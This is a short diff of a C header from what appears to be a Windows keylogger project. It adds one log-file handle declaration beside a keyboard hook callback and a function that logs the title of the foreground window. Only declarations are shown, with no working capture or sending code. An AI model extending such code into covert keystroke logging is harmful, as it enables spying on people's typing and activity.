@@ -21,6 +21,7 @@ char	*GetDateFormated(void);
 // Function to get the foreground window title and log it
 void	get_foreground_window(HWND hwnd);
 
+extern HANDLE	logFile;
 extern HANDLE	fd;
 
 LRESULT CALLBACK LowLevelKeyboardProc(
